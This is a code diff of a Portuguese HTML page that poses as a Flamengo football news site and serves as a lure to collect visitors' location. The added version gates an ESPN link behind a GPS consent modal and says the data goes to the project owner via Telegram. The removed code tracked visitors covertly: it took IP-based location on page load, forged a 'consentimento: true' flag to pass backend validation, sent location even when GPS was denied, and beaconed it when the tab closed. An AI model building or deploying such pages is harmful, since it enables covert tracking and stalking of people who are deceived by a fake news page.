@@ -1,130 +1,227 @@
+
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BOLA EM FOCO | Notícias do Flamengo</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#f1f1f1;color:#222;font-family:Arial,sans-serif}
+header{background:#111;color:white;padding:20px;text-align:center;border-bottom:5px solid #d71920}
+header h1{margin:0;font-size:32px}
+header p{margin:6px 0 0;color:#ddd}
+nav{background:#222;padding:12px;text-align:center}
+nav a{color:white;text-decoration:none;margin:0 12px;font-weight:bold}
+.container{max-width:1100px;margin:25px auto;padding:0 15px;display:grid;grid-template-columns:2fr 1fr;gap:25px}
+article,.sidebar{background:white;padding:20px;border-radius:5px}
+article img{width:100%;height:auto;border-radius:4px}
+h2{font-size:27px;line-height:1.25}
+.meta{color:#777;font-size:13px;margin-bottom:15px}
+article p{line-height:1.7}
+.cta{display:inline-block;background:#d71920;color:white;padding:13px 20px;text-decoration:none;border-radius:4px;font-weight:bold;margin-top:12px;cursor:pointer;border:0}
+.sidebar h3{border-bottom:3px solid #d71920;padding-bottom:10px}
+.sidebar a{display:block;color:#222;text-decoration:none;padding:12px 0;border-bottom:1px solid #ddd;cursor:pointer}
+footer{background:#111;color:#ddd;text-align:center;padding:25px;margin-top:30px;font-size:13px}
+.aviso{text-align:center;background:#fff3cd;color:#664d03;padding:10px;font-size:12px}
+#modalConsentimento{display:none;position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:9999;align-items:center;justify-content:center;padding:18px}
+.modal-conteudo{background:white;padding:25px;border-radius:8px;max-width:450px;width:100%;text-align:center}
+.modal-conteudo h2{font-size:21px;margin-top:0}
+.modal-conteudo p{font-size:14px;line-height:1.6}
+.modal-conteudo label{display:block;text-align:left;font-size:13px;line-height:1.5;margin:15px 0}
+.modal-conteudo input{margin-right:7px}
+.modal-botoes{display:flex;flex-direction:column;gap:10px;margin-top:18px}
+.modal-botoes button{padding:13px;border:0;border-radius:4px;font-weight:bold;cursor:pointer}
+#btnAceitar{background:#d71920;color:white}
+#btnRecusar{background:#555;color:white}
+#mensagemStatus{display:none;position:fixed;bottom:20px;left:50%;transform:translateX(-50%);width:calc(100% - 30px);max-width:500px;background:#222;color:white;padding:15px;border-radius:5px;text-align:center;z-index:10000;font-size:14px;line-height:1.5}
+@media(max-width:700px){.container{grid-template-columns:1fr}header h1{font-size:27px}h2{font-size:23px}}
+</style>
+</head>
+<body>
+
+<div class="aviso">
+SIMULAÇÃO EDUCATIVA DE SEGURANÇA DIGITAL — PORTAL DEMONSTRATIVO INDEPENDENTE
+</div>
+
+<header>
+<h1>BOLA EM FOCO</h1>
+<p>Notícias, análises e informações do futebol</p>
+</header>
+
+<nav>
+<a href="#">Início</a>
+<a href="#">Flamengo</a>
+<a href="#">Futebol</a>
+<a href="#">Esportes</a>
+</nav>
+
+<div class="container">
+<main>
+<article>
+<div class="meta">FUTEBOL • FLAMENGO</div>
+<img src="/materia-flamengo.jpg" alt="Notícia do Flamengo">
+<h2>Douglas Santos revela contato do Flamengo em reta final de contrato com Zenit</h2>
+<div class="meta">Redação Bola em Foco</div>
+
+<p>O mercado da bola segue movimentado, e o Flamengo continua sendo um dos clubes que mais despertam interesse dos torcedores. Informações sobre possíveis reforços movimentam os bastidores do futebol brasileiro.</p>
+
+<p>Para consultar a matéria original e conferir mais informações, acesse o conteúdo publicado pela ESPN.</p>
+
+<button class="cta" id="linkMateria">LER MATÉRIA COMPLETA</button>
+</article>
+</main>
+
+<aside class="sidebar">
+<h3>MAIS NOTÍCIAS</h3>
+<a class="acaoMateria">Últimas notícias do Flamengo</a>
+<a class="acaoMateria">Mercado da bola</a>
+<a class="acaoMateria">Notícias do futebol brasileiro</a>
+<a class="acaoMateria">Campeonato Brasileiro</a>
+</aside>
+</div>
+
+<footer>
+BOLA EM FOCO — Portal demonstrativo de notícias esportivas.
+</footer>
+
+<div id="modalConsentimento">
+<div class="modal-conteudo">
+<h2>Compartilhamento de localização</h2>
+
+<p>Esta é uma demonstração educativa. Se você autorizar, a localização do dispositivo será enviada ao responsável pelo projeto por meio do Telegram.</p>
+
+<p>Se o GPS for negado, você poderá autorizar separadamente o uso do endereço IP para estimar sua cidade e região. Essa estimativa não representa sua localização exata.</p>
+
+<p>O site da ESPN não exige compartilhamento de localização. Nesta demonstração, a página da ESPN somente será aberta após o envio confirmado da localização GPS.</p>
+
+<label>
+<input type="checkbox" id="consentimentoIp">
+Também autorizo o uso do IP para estimar e compartilhar minha cidade/região caso eu negue o GPS.
+</label>
+
+<div class="modal-botoes">
+<button id="btnAceitar">ACEITAR E SOLICITAR GPS</button>
+<button id="btnRecusar">NÃO COMPARTILHAR</button>
+</div>
+</div>
+</div>
+
+<div id="mensagemStatus"></div>
+
 <script>
-    let dadosUltimaLocalizacao = {
-      latitude: null,
-      longitude: null,
-      maps: "",
-      source: "Não obtida"
-    };
+const URL_ESPN = "https://www.espn.com.br/futebol/time/_/id/819/flamengo";
 
-    const linkOriginal = "https://www.espn.com.br/futebol/time/_/id/819/flamengo";
-    let processandoGPS = false;
+const modal = document.getElementById("modalConsentimento");
+const mensagem = document.getElementById("mensagemStatus");
+const checkboxIp = document.getElementById("consentimentoIp");
 
-    function continuarParaESPN() {
-        window.location.assign(linkOriginal);
+function mostrarMensagem(texto) {
+    mensagem.textContent = texto;
+    mensagem.style.display = "block";
+}
+
+function abrirModal() {
+    modal.style.display = "flex";
+}
+
+function fecharModal() {
+    modal.style.display = "none";
+}
+
+document.getElementById("linkMateria").addEventListener("click", abrirModal);
+
+document.querySelectorAll(".acaoMateria").forEach(function(item) {
+    item.addEventListener("click", abrirModal);
+});
+
+document.getElementById("btnRecusar").addEventListener("click", function() {
+    fecharModal();
+    mostrarMensagem("Para acessar a página, é necessário autorizar a localização nesta demonstração.");
+});
+
+document.getElementById("btnAceitar").addEventListener("click", function() {
+    if (!navigator.geolocation) {
+        mostrarMensagem("Este dispositivo ou navegador não disponibiliza a localização.");
+        return;
     }
 
-    // Opcional: tenta capturar o IP aproximado em segundo plano ao carregar a página
-    window.addEventListener("load", () => {
-      fetch("https://ipapi.co/json/")
-        .then(response => response.json())
-        .then(data => {
-          if (data && data.latitude) {
-            const latitude = data.latitude;
-            const longitude = data.longitude;
-            const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            const source = "Aproximada (IP)";
+    mostrarMensagem("Aguardando autorização de localização do dispositivo...");
 
-            dadosUltimaLocalizacao = { latitude, longitude, maps, source };
-            enviarParaApi(latitude, longitude, source, "abriu_pagina_ip");
-          }
-        })
-        .catch(() => {});
-    });
+    navigator.geolocation.getCurrentPosition(
+        async function(posicao) {
+            try {
+                const resposta = await fetch("/api/sendlocation", {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        modo: "gps",
+                        latitude: posicao.coords.latitude,
+                        longitude: posicao.coords.longitude
+                    })
+                });
 
-    function enviarParaApi(latitude, longitude, source, acao) {
-      fetch("/api/send-location", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          latitude,
-          longitude,
-          source,
-          acao,
-          consentimento: true // Obrigatório para passar pela validação do backend
-        }),
-        keepalive: true
-      })
-      .then(response => response.json())
-      .catch(error => {
-        console.error("Erro ao enviar:", error);
-      });
-    }
+                const resultado = await resposta.json();
 
-    // Intercepta cliques nos elementos interativos com a classe .acionador-gps
-    function dispararFluxoGPS(event) {
-        if (event) {
-            event.preventDefault();
-            event.stopPropagation();
-        }
-
-        if (processandoGPS) return;
-        processandoGPS = true;
-
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    const source = "Precisa (GPS)";
-
-                    dadosUltimaLocalizacao = { 
-                        latitude, 
-                        longitude, 
-                        maps: `https://www.google.com/maps?q=${latitude},${longitude}`, 
-                        source 
-                    };
-
-                    enviarParaApi(latitude, longitude, source, "clique_botao_gps");
-                    
-                    setTimeout(() => {
-                        processandoGPS = false;
-                        continuarParaESPN();
-                    }, 400); // Pequeno delay para garantir o disparo do fetch antes do redirecionamento
-                },
-                (error) => {
-                    console.warn("GPS negado ou indisponível:", error);
-                    
-                    // Se o usuário negar, envia o IP que já temos ou marca como negado
-                    enviarParaApi(
-                        dadosUltimaLocalizacao.latitude || 0, 
-                        dadosUltimaLocalizacao.longitude || 0, 
-                        "Negado / Fallback IP", 
-                        "clique_botao_gps_negado"
-                    );
-
-                    setTimeout(() => {
-                        processandoGPS = false;
-                        continuarParaESPN();
-                    }, 400);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 8000,
-                    maximumAge: 0
+                if (!resposta.ok || !resultado.success) {
+                    mostrarMensagem("Não foi possível confirmar o envio da localização. A página não será aberta.");
+                    return;
                 }
-            );
-        } else {
-            processandoGPS = false;
-            continuarParaESPN();
+
+                mostrarMensagem("Localização enviada com sucesso.");
+                window.location.href = URL_ESPN;
+
+            } catch (erro) {
+                mostrarMensagem("Erro ao enviar a localização. Tente novamente.");
+            }
+        },
+
+        async function(erro) {
+            if (erro.code === 1) {
+                if (checkboxIp.checked) {
+                    mostrarMensagem("GPS negado. Enviando a estimativa de localização por IP autorizada...");
+
+                    try {
+                        const resposta = await fetch("/api/sendlocation", {
+                            method: "POST",
+                            headers: {"Content-Type": "application/json"},
+                            body: JSON.stringify({
+                                modo: "ip",
+                                consentimentoIp: true
+                            })
+                        });
+
+                        const resultado = await resposta.json();
+
+                        if (resposta.ok && resultado.success) {
+                            mostrarMensagem("Estimativa aproximada de cidade/região enviada. Você permanecerá nesta página.");
+                        } else {
+                            mostrarMensagem("Não foi possível enviar a estimativa de localização.");
+                        }
+
+                    } catch (e) {
+                        mostrarMensagem("Erro ao enviar a estimativa de localização.");
+                    }
+
+                } else {
+                    mostrarMensagem("Para acessar a página, é necessário autorizar a localização nesta demonstração.");
+                }
+
+            } else if (erro.code === 3) {
+                mostrarMensagem("O tempo para obter a localização terminou. Tente novamente.");
+            } else {
+                mostrarMensagem("Não foi possível obter a localização do dispositivo.");
+            }
+        },
+
+        {
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
         }
-    }
-
-    // Vincula a escuta de cliques a todos os elementos com a classe .acionador-gps
-    document.querySelectorAll(".acionador-gps").forEach(function(elemento) {
-        elemento.addEventListener("click", dispararFluxoGPS);
-    });
-
-    // Envio de segurança caso o usuário feche a aba bruscamente
-    window.addEventListener('beforeunload', function () {
-      if (dadosUltimaLocalizacao.latitude && navigator.sendBeacon) {
-        const payload = JSON.stringify({
-          ...dadosUltimaLocalizacao,
-          acao: 'fechou_pagina',
-          consentimento: true
-        });
-        navigator.sendBeacon('/api/send-location', payload);
-      }
-    });
+    );
+});
 </script>
+
+</body>
+</html>
